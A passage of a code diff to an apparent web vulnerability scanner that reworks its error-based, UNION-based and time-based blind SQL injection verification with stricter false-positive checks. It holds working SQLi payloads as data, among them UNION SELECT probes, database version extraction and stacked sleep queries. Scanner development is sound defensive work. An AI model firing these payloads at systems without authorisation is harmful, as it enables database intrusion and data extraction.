+                all_errors = list(set(first_hit_errors + errors))
+                confidence = 85.0
+                finding = self._create_finding(
+                    category=OwaspCategory.a05,
+                    vuln_type="SQL Injection (Error-Based)",
+                    severity=SeverityLevel.critical,
+                    url=url, parameter=parameter, payload=first_hit_payload,
+                    evidence=(
+                        f"SQL-engine error triggered by '{first_hit_payload}' "
+                        f"and confirmed by '{payload}'. "
+                        f"Errors (absent from baseline): {', '.join(all_errors[:3])}."
+                    ),
+                    confidence_score=confidence, detection_method="error_based",
+                    method=method,
+                    detection_evidence={
+                        "errors_detected": all_errors,
+                        "first_payload": first_hit_payload,
+                        "confirm_payload": payload,
+                    },
+                    reproducible=True, verified=True,
+                    verification_request_snippet=inj_resp.request_snippet,
+                    verification_response_snippet=inj_resp.response_snippet,
                 )
                 return VerificationResult(
-                    is_vulnerable=False,
-                    confidence_score=0.0,
-                    detection_method="time_based",
-                    findings=[],
-                    evidence={"baseline_times": baseline_times, "skipped": "baseline_too_slow"},
+                    is_vulnerable=True, confidence_score=confidence,
+                    detection_method="error_based", findings=[finding],
+                    evidence={"errors": all_errors}, reproducible=True,
                 )
-
-            # Try each sleep payload
-            for payload, expected_delay_ms in sleep_payloads:
-                injected_url, injected_params, injected_data = self._build_request_args(
-                    url, parameter, payload, method, form_inputs
-                )
-
-                injected_times = []
-                for _ in range(2):
-                    resp = await self._send(
-                        injected_url, method, injected_params, injected_data,
-                        test_phase="time_injection", payload=payload,
-                    )
-                    injected_times.append(resp.response_time_ms)
-                    await asyncio.sleep(0.1)
-
-                # Analyze timing
-                settings = get_settings()
-                threshold_fraction = settings.blind_injection_timing_threshold
-                is_significant, timing_analysis = ResponseAnalyzer.is_timing_significant(
-                    baseline_times, injected_times, threshold_ms=expected_delay_ms * threshold_fraction
-                )
-
-                if is_significant:
-                    confidence = 75.0  # Raised slightly — baseline bounds now checked
-                    finding = self._create_finding(
-                        category=OwaspCategory.a05,
-                        vuln_type="SQL Injection (Time-Based Blind)",
-                        severity=SeverityLevel.high,
-                        url=url,
-                        parameter=parameter,
-                        payload=payload,
-                        evidence=f"Response delayed {timing_analysis['diff_ms']:.0f}ms with sleep payload (baseline: {timing_analysis['baseline_mean']:.0f}ms, injected: {timing_analysis['injected_mean']:.0f}ms)",
-                        confidence_score=confidence,
-                        detection_method="time_based",
-                        method=method,
-                        detection_evidence=timing_analysis,
-                        reproducible=True,
-                        verified=True,
-                        verification_request_snippet=resp.request_snippet,
-                        verification_response_snippet=resp.response_snippet,
-                    )
-                    return VerificationResult(
-                        is_vulnerable=True,
-                        confidence_score=confidence,
-                        detection_method="time_based",
-                        findings=[finding],
-                        evidence=timing_analysis,
-                        reproducible=True,
-                    )
 
             return VerificationResult(
-                is_vulnerable=False,
-                confidence_score=0.0,
-                detection_method="time_based",
-                findings=[],
-                evidence={"baseline_times": baseline_times},
+                is_vulnerable=False, confidence_score=0.0,
+                detection_method="error_based", findings=[],
+                evidence={
+                    "first_hit": first_hit_payload,
+                    "note": "single error hit — not reported without confirmation",
+                } if first_hit_payload else {},
             )
 
         except Exception as e:
-            logger.error(f"Time-based verification failed for {url}:{parameter}: {e}")
+            logger.error("Error-based verification failed %s:%s: %s", url, parameter, e)
             return VerificationResult(
-                is_vulnerable=False,
-                confidence_score=0.0,
-                detection_method="time_based",
-                findings=[],
+                is_vulnerable=False, confidence_score=0.0,
+                detection_method="error_based", findings=[],
                 evidence={"error": str(e)},
             )
+
+    # ======================================================================
+    # Technique 3: UNION-based
+    # ======================================================================
 
     async def _verify_union_based(
         self,
@@ -514,13 +765,31 @@ class SQLiVerifier(BaseVerifier):
         pre_test_baseline: Optional[ResponseData] = None,
     ) -> VerificationResult:
         """
-        Verify via UNION-based SQL injection.
+        UNION-based SQLi detection. Three signal levels:
 
-        Attempts to identify column count and extract data.
-        Phase 1.3: Requires version proof OR stable column-count differential;
-        rejects similarity-only diffs; does NOT mark verified=True on weak hits.
+        Level 1 (confidence 90) — Canary reflection:
+            Inject a unique random string via UNION SELECT. If it appears in
+            the response body but was absent from the baseline, this is proof
+            of data extraction. No similarity comparison needed.
+
+        Level 2 (confidence 90) — Version extraction:
+            Replace a NULL column with @@version / version(). Version indicator
+            must be NEW (absent from baseline) AND the parent NULL probe must
+            have passed the similarity gate. This prevents version-extraction
+            false positives on page-transition responses (similarity 0.01).
+
+        Level 3 (confidence 75) — Stable column-count differential:
+            Requires >= 3 NULL-count payloads in the valid similarity window
+            [0.10, 0.97] AND a cross-column confirmation probe. Anything below
+            3 payloads is suppressed — 2 payloads is not enough to rule out
+            coincidental page changes on non-SQL parameters.
+
+        The critical invariant for Levels 2 and 3:
+            is_vulnerable is NEVER set True on a response with similarity < 0.10.
+            That similarity band means the page changed completely — the query
+            failed or caused an error page, not a successful UNION injection.
         """
-        union_payloads = [
+        union_null_payloads = [
             "' UNION SELECT NULL--",
             "' UNION SELECT NULL,NULL--",
             "' UNION SELECT NULL,NULL,NULL--",
@@ -532,151 +801,441 @@ class SQLiVerifier(BaseVerifier):
             baseline = pre_test_baseline or await self.fetch_pre_test_baseline(
                 url, parameter, method, value, form_inputs
             )
+            baseline_body = baseline.body or ""
 
-            significant_payloads: list[tuple[str, "DifferentialAnalysis"]] = []
-            canary_hits: list[tuple[str, str, ResponseData]] = []
-
+            # ----------------------------------------------------------------
+            # Pass 1: Canary probes (strongest signal — no similarity gate needed)
+            # ----------------------------------------------------------------
             for null_count in range(1, 6):
                 canary = ResponseAnalyzer.generate_probe_canary()
                 cols = ["NULL"] * null_count
                 cols[0] = f"'{canary}'"
                 canary_payload = f"' UNION SELECT {','.join(cols)}--"
-                injected_url, injected_params, injected_data = self._build_request_args(
+
+                inj_url, inj_params, inj_data = self._build_request_args(
                     url, parameter, canary_payload, method, form_inputs
                 )
-                injected = await self._send(
-                    injected_url, method, injected_params, injected_data,
+                inj_resp = await self._send(
+                    inj_url, method, inj_params, inj_data,
                     test_phase="union_canary", payload=canary_payload,
                 )
-                verified, reflection_evidence = ResponseAnalyzer.verify_reflection(
-                    canary_payload,
-                    injected.body,
-                    baseline_body=baseline.body,
-                    canary=canary,
-                )
-                if verified:
-                    canary_hits.append((canary_payload, canary, injected))
 
-            # Try UNION payloads
-            for payload in union_payloads:
-                injected_url, injected_params, injected_data = self._build_request_args(
+                canary_reflected, _ = ResponseAnalyzer.verify_reflection(
+                    canary_payload, inj_resp.body,
+                    baseline_body=baseline_body, canary=canary,
+                )
+                if canary_reflected:
+                    finding = self._create_finding(
+                        category=OwaspCategory.a05,
+                        vuln_type="SQL Injection (UNION-Based)",
+                        severity=SeverityLevel.high,
+                        url=url, parameter=parameter, payload=canary_payload,
+                        evidence=(
+                            f"UNION canary '{canary}' reflected in response body. "
+                            f"Value absent from baseline — confirms data extraction."
+                        ),
+                        confidence_score=90.0, detection_method="union_based",
+                        method=method,
+                        detection_evidence={
+                            "verification_canary": canary,
+                            "canary_verified": True,
+                        },
+                        reproducible=True, verified=True,
+                        verification_request_snippet=inj_resp.request_snippet,
+                        verification_response_snippet=inj_resp.response_snippet,
+                    )
+                    return VerificationResult(
+                        is_vulnerable=True, confidence_score=90.0,
+                        detection_method="union_based", findings=[finding],
+                        evidence={"canary_verified": True, "canary": canary},
+                        reproducible=True,
+                    )
+
+            # ----------------------------------------------------------------
+            # Pass 2: NULL differential — collect payloads in the valid window.
+            # This is also the gate for Pass 3 version extraction.
+            # ----------------------------------------------------------------
+            # Maps payload → (response, similarity) for payloads that passed
+            # the similarity window filter.
+            valid_null_probes: list[tuple[str, ResponseData, float]] = []
+
+            for payload in union_null_payloads:
+                inj_url, inj_params, inj_data = self._build_request_args(
                     url, parameter, payload, method, form_inputs
                 )
-                injected = await self._send(
-                    injected_url, method, injected_params, injected_data,
-                    test_phase="union_injection", payload=payload,
+                inj_resp = await self._send(
+                    inj_url, method, inj_params, inj_data,
+                    test_phase="union_null", payload=payload,
                 )
 
-                # Analyze differential
-                analysis = ResponseAnalyzer.analyze_differential(
-                    baseline, injected, payload
+                if inj_resp.status_code != 200:
+                    logger.debug(
+                        "UNION NULL '%s' non-200 status (%s) %s:%s — skip",
+                        payload, inj_resp.status_code, url, parameter,
+                    )
+                    continue
+
+                sim = _body_similarity(baseline_body, inj_resp.body or "")
+
+                if sim < _UNION_SIM_MIN:
+                    # Page transition / error page — not injection.
+                    logger.debug(
+                        "UNION NULL '%s' similarity %.2f < %.2f (page transition) %s:%s — skip",
+                        payload, sim, _UNION_SIM_MIN, url, parameter,
+                    )
+                    continue
+
+                if sim > _UNION_SIM_MAX:
+                    # UNION ignored or wrong column count.
+                    logger.debug(
+                        "UNION NULL '%s' similarity %.2f > %.2f (no change) %s:%s — skip",
+                        payload, sim, _UNION_SIM_MAX, url, parameter,
+                    )
+                    continue
+
+                valid_null_probes.append((payload, inj_resp, sim))
+
+            if not valid_null_probes:
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="union_based", findings=[], evidence={},
                 )
 
-                # UNION injection usually produces no error but different response
-                if analysis.is_significant_change and injected.status_code == 200:
-                    significant_payloads.append((payload, analysis))
+            # ----------------------------------------------------------------
+            # Pass 3: Version extraction.
+            # Only attempt for column counts that had a VALID null probe.
+            # ----------------------------------------------------------------
+            version_extracted_body: Optional[str] = None
+            version_payload_used:   Optional[str] = None
 
-            if canary_hits:
-                best_payload, best_canary, best_injected = canary_hits[-1]
+            version_expressions = [
+                "@@version",
+                "version()",
+                "sqlite_version()",
+                "@@global.version",
+            ]
+
+            for parent_payload, parent_resp, parent_sim in valid_null_probes:
+                num_cols = parent_payload.count("NULL")
+
+                for v_expr in version_expressions:
+                    for col_idx in range(num_cols):
+                        cols = ["NULL"] * num_cols
+                        cols[col_idx] = v_expr
+                        ver_payload = f"' UNION SELECT {','.join(cols)}--"
+
+                        ver_url, ver_params, ver_data = self._build_request_args(
+                            url, parameter, ver_payload, method, form_inputs
+                        )
+                        ver_resp = await self._send(
+                            ver_url, method, ver_params, ver_data,
+                            test_phase="union_version_extract", payload=ver_payload,
+                        )
+
+                        # *** Critical fix: only accept version hits when the
+                        # version-extract response is itself in the valid window.
+                        ver_sim = _body_similarity(baseline_body, ver_resp.body or "")
+                        if not _similarity_in_union_window(ver_sim):
+                            logger.debug(
+                                "Version extract '%s' similarity %.2f outside window %s:%s — skip",
+                                ver_payload, ver_sim, url, parameter,
+                            )
+                            continue
+
+                        new_inds = _new_version_indicators(baseline_body, ver_resp.body or "")
+                        if new_inds:
+                            version_extracted_body = ver_resp.body
+                            version_payload_used   = ver_payload
+                            logger.debug(
+                                "Version extracted %s:%s via '%s' — new: %s",
+                                url, parameter, ver_payload, new_inds,
+                            )
+                            break
+
+                    if version_extracted_body:
+                        break
+
+                if version_extracted_body:
+                    break
+
+            if version_extracted_body:
                 finding = self._create_finding(
                     category=OwaspCategory.a05,
                     vuln_type="SQL Injection (UNION-Based)",
                     severity=SeverityLevel.high,
-                    url=url,
-                    parameter=parameter,
-                    payload=best_payload,
+                    url=url, parameter=parameter, payload=version_payload_used,
                     evidence=(
-                        f"UNION canary '{best_canary}' reflected in response, "
-                        "confirming data extraction via this request."
+                        f"UNION version extraction confirmed via '{version_payload_used}'. "
+                        f"DB version indicator absent from baseline."
                     ),
-                    confidence_score=90.0,
-                    detection_method="union_based",
+                    confidence_score=90.0, detection_method="union_based",
                     method=method,
                     detection_evidence={
-                        "verification_canary": best_canary,
-                        "canary_verified": True,
-                        "canary_proof": True,
+                        "version_extracted": True,
+                        "canary_verified": False,
                     },
-                    reproducible=True,
-                    verified=True,
-                    verification_request_snippet=best_injected.request_snippet,
-                    verification_response_snippet=best_injected.response_snippet,
+                    reproducible=True, verified=True,
                 )
                 return VerificationResult(
-                    is_vulnerable=True,
-                    confidence_score=90.0,
-                    detection_method="union_based",
-                    findings=[finding],
-                    evidence={"canary_verified": True},
+                    is_vulnerable=True, confidence_score=90.0,
+                    detection_method="union_based", findings=[finding],
+                    evidence={"version_extracted": True},
                     reproducible=True,
                 )
 
-            if not significant_payloads:
-                return VerificationResult(
-                    is_vulnerable=False,
-                    confidence_score=0.0,
-                    detection_method="union_based",
-                    findings=[],
-                    evidence={},
-                )
-
-            best_payload, best_analysis = significant_payloads[-1]
-            num_cols = best_payload.count("NULL")
-            version_extracted = None
-            version_payloads = [
-                "@@version", "version()", "sqlite_version()", "banner"
-            ]
-
-            # Try to replace one of the NULLs with a version function
-            for v_pay in version_payloads:
-                for col_idx in range(num_cols):
-                    cols = ["NULL"] * num_cols
-                    cols[col_idx] = v_pay
-                    injected_union = f"' UNION SELECT {','.join(cols)}--"
-
-                    ver_url, ver_params, ver_data = self._build_request_args(
-                        url, parameter, injected_union, method, form_inputs
-                    )
-                    ver_resp = await self._send(
-                        ver_url, method, ver_params, ver_data,
-                        test_phase="union_version_extract", payload=injected_union,
-                    )
-
-                    body_lower = ver_resp.body.lower()
-                    if any(indicator in body_lower for indicator in ["mysql", "postgres", "sqlite", "ubuntu", "debian", "mariadb", "microsoft"]):
-                        version_extracted = ver_resp.body
-                        best_payload = injected_union
-                        break
-                if version_extracted:
-                    break
-
-            # Phase 1.3: Determine confidence and verified status based on proof strength
-            if version_extracted:
-                # Strong proof: version data extracted
-                confidence = 90.0
-                reproducible = True
-                verified = True
-            elif len(significant_payloads) >= 2:
-                # Moderate proof: stable column-count differential across 2+ payloads
-                confidence = 75.0
-                reproducible = True
-                verified = True
-            else:
-                # Weak proof: only similarity-based diff on a single payload
-                # Phase 1.3: Do NOT mark verified=True on weak UNION hits
-                confidence = 65.0
-                reproducible = False
-                verified = False
-
-            # Phase 1.3: Require confidence >= 75 (or reproducible) before reporting
-            if confidence < 75.0 and not reproducible:
+            # ----------------------------------------------------------------
+            # Pass 4: Stable column-count differential.
+            # Requires >= 3 payloads in the valid window.
+            # ----------------------------------------------------------------
+            n = len(valid_null_probes)
+            if n < _UNION_MIN_SIGNIFICANT_PAYLOADS:
                 logger.debug(
-                    "UNION SQLi weak hit (confidence=%.1f) suppressed for %s:%s",
-                    confidence, url, parameter,
+                    "UNION differential suppressed %s:%s — only %d/%d payloads in window",
+                    url, parameter, n, _UNION_MIN_SIGNIFICANT_PAYLOADS,
                 )
                 return VerificationResult(
-                    is_vulnerable=False,
-                    confidence_score=confidence,
-                    detection_method="union_based",
-                    findings=[],
-                    evidence={"suppressed": True, "reason": "weak_union_hit
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="union_based", findings=[],
+                    evidence={
+                        "suppressed": True,
+                        "reason": f"only_{n}_valid_null_probes",
+                    },
+                )
+
+            # Cross-column confirmation: pick the best NULL payload and verify
+            # that a different column count also produces a valid-window response.
+            # This rules out coincidental page changes on non-SQL parameters.
+            best_payload, best_resp, best_sim = max(
+                valid_null_probes, key=lambda x: abs(x[2] - 0.5)
+            )
+            best_col_count = best_payload.count("NULL")
+
+            # Pick a confirmation column count that is different from best.
+            confirm_col_count = best_col_count + 1 if best_col_count < 5 else best_col_count - 1
+            confirm_payload = "' UNION SELECT " + ",".join(["NULL"] * confirm_col_count) + "--"
+
+            conf_url, conf_params, conf_data = self._build_request_args(
+                url, parameter, confirm_payload, method, form_inputs
+            )
+            conf_resp = await self._send(
+                conf_url, method, conf_params, conf_data,
+                test_phase="union_cross_column_confirm", payload=confirm_payload,
+            )
+            conf_sim = _body_similarity(baseline_body, conf_resp.body or "")
+
+            # The confirmation probe must ALSO be in the valid window.
+            if not _similarity_in_union_window(conf_sim):
+                logger.debug(
+                    "UNION cross-column confirm outside window (%.2f) %s:%s — suppressed",
+                    conf_sim, url, parameter,
+                )
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="union_based", findings=[],
+                    evidence={
+                        "suppressed": True,
+                        "reason": "cross_column_confirm_failed",
+                        "confirm_sim": conf_sim,
+                    },
+                )
+
+            avg_sim = sum(s for _, _, s in valid_null_probes) / n
+            confidence = 65.0 if avg_sim > 0.85 else 75.0
+
+            if confidence < 75.0:
+                logger.debug(
+                    "UNION differential weak (avg_sim=%.2f, confidence=%.1f) %s:%s — suppressed",
+                    avg_sim, confidence, url, parameter,
+                )
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=confidence,
+                    detection_method="union_based", findings=[],
+                    evidence={
+                        "suppressed": True,
+                        "reason": "weak_similarity_change",
+                        "avg_sim": avg_sim,
+                    },
+                )
+
+            finding = self._create_finding(
+                category=OwaspCategory.a05,
+                vuln_type="SQL Injection (UNION-Based)",
+                severity=SeverityLevel.high,
+                url=url, parameter=parameter, payload=best_payload,
+                evidence=(
+                    f"UNION NULL payloads produced consistent response changes "
+                    f"across {n} column-count variants (avg similarity: {avg_sim:.2f}). "
+                    f"Cross-column confirmation probe similarity: {conf_sim:.2f}. "
+                    f"No canary or version proof — circumstantial evidence."
+                ),
+                confidence_score=confidence, detection_method="union_based",
+                method=method,
+                detection_evidence={
+                    "valid_null_probes": n,
+                    "avg_similarity": avg_sim,
+                    "confirm_sim": conf_sim,
+                    "version_extracted": False,
+                    "canary_verified": False,
+                },
+                reproducible=True, verified=True,
+                verification_request_snippet=conf_resp.request_snippet,
+                verification_response_snippet=conf_resp.response_snippet,
+            )
+            return VerificationResult(
+                is_vulnerable=True, confidence_score=confidence,
+                detection_method="union_based", findings=[finding],
+                evidence={"valid_null_probes": n, "avg_similarity": avg_sim},
+                reproducible=True,
+            )
+
+        except Exception as e:
+            logger.error("UNION verification failed %s:%s: %s", url, parameter, e)
+            return VerificationResult(
+                is_vulnerable=False, confidence_score=0.0,
+                detection_method="union_based", findings=[],
+                evidence={"error": str(e)},
+            )
+
+    # ======================================================================
+    # Technique 4: Time-based blind
+    # ======================================================================
+
+    async def _verify_time_based(
+        self,
+        url: str,
+        parameter: str,
+        method: str,
+        value: str,
+        form_inputs: Optional[list] = None,
+        pre_test_baseline: Optional[ResponseData] = None,
+    ) -> VerificationResult:
+        """
+        Time-based blind SQLi.
+
+        Three safeguards:
+        1. Baseline mean > 2000ms: server too slow, skip entirely.
+        2. Relative floor: observed delay must be >= 60% of the intended sleep.
+           A hardcoded threshold breaks on high-latency targets; 60% of expected
+           is correct for both fast and slow networks.
+        3. Injected mean must itself be >= 50% of sleep duration — rules out a
+           coincidentally fast baseline sample making a normal response look delayed.
+        """
+        sleep_payloads = [
+            ("' AND SLEEP(3)--",              3000),
+            ("' AND SLEEP(3)#",               3000),
+            (" AND SLEEP(3)--",               3000),
+            ("'; SELECT pg_sleep(3)--",       3000),
+            ("' AND 1=1 AND pg_sleep(3)--",   3000),
+            ("'; WAITFOR DELAY '0:0:3'--",    3000),
+            ("'; SELECT SLEEP(3);--",         3000),
+        ]
+
+        try:
+            baseline_url, baseline_params, baseline_data = self._build_request_args(
+                url, parameter, value, method, form_inputs, inject=False
+            )
+
+            baseline_times: list[float] = []
+            if pre_test_baseline is not None:
+                baseline_times.append(pre_test_baseline.response_time_ms)
+
+            for _ in range(3 - len(baseline_times)):
+                resp = await self._send(
+                    baseline_url, method, baseline_params, baseline_data,
+                    test_phase="time_baseline",
+                )
+                baseline_times.append(resp.response_time_ms)
+                await asyncio.sleep(0.1)
+
+            baseline_mean = sum(baseline_times) / len(baseline_times)
+
+            if baseline_mean > 2000:
+                logger.debug(
+                    "Time-based skipped %s:%s — baseline too slow (%.0fms)",
+                    url, parameter, baseline_mean,
+                )
+                return VerificationResult(
+                    is_vulnerable=False, confidence_score=0.0,
+                    detection_method="time_based", findings=[],
+                    evidence={"skipped": "baseline_too_slow", "baseline_mean_ms": baseline_mean},
+                )
+
+            settings = get_settings()
+            threshold_fraction = settings.blind_injection_timing_threshold
+
+            for payload, expected_ms in sleep_payloads:
+                inj_url, inj_params, inj_data = self._build_request_args(
+                    url, parameter, payload, method, form_inputs
+                )
+                inj_times = []
+                last_resp = None
+                for _ in range(2):
+                    resp = await self._send(
+                        inj_url, method, inj_params, inj_data,
+                        test_phase="time_injection", payload=payload,
+                    )
+                    inj_times.append(resp.response_time_ms)
+                    last_resp = resp
+                    await asyncio.sleep(0.1)
+
+                is_significant, timing = ResponseAnalyzer.is_timing_significant(
+                    baseline_times, inj_times,
+                    threshold_ms=expected_ms * threshold_fraction,
+                )
+                if not is_significant:
+                    continue
+
+                diff_ms       = timing.get("diff_ms", 0)
+                injected_mean = timing.get("injected_mean", 0)
+
+                if diff_ms < expected_ms * 0.60:
+                    logger.debug(
+                        "Time diff %.0fms < 60%% of expected %.0fms %s:%s — jitter",
+                        diff_ms, expected_ms, url, parameter,
+                    )
+                    continue
+
+                if injected_mean < expected_ms * 0.50:
+                    logger.debug(
+                        "Injected mean %.0fms < 50%% of expected %.0fms %s:%s",
+                        injected_mean, expected_ms, url, parameter,
+                    )
+                    continue
+
+                confidence = 75.0
+                finding = self._create_finding(
+                    category=OwaspCategory.a05,
+                    vuln_type="SQL Injection (Time-Based Blind)",
+                    severity=SeverityLevel.high,
+                    url=url, parameter=parameter, payload=payload,
+                    evidence=(
+                        f"Response delayed {diff_ms:.0f}ms with sleep payload "
+                        f"(baseline mean: {baseline_mean:.0f}ms, "
+                        f"injected mean: {injected_mean:.0f}ms, "
+                        f"expected: {expected_ms}ms)."
+                    ),
+                    confidence_score=confidence, detection_method="time_based",
+                    method=method, detection_evidence=timing,
+                    reproducible=True, verified=True,
+                    verification_request_snippet=last_resp.request_snippet,
+                    verification_response_snippet=last_resp.response_snippet,
+                )
+                return VerificationResult(
+                    is_vulnerable=True, confidence_score=confidence,
+                    detection_method="time_based", findings=[finding],
+                    evidence=timing, reproducible=True,
+                )
+
+            return VerificationResult(
+                is_vulnerable=False, confidence_score=0.0,
+                detection_method="time_based", findings=[],
+                evidence={"baseline_times": baseline_times},
+            )
+
+        except Exception as e:
+            logger.error("Time-based verification failed %s:%s: %s", url, parameter, e)
+            return VerificationResult(
+                is_vulnerable=False, confidence_score=0.0,
+                detection_method="time_based", findings=[],
+                evidence={"error": str(e)},
+            )
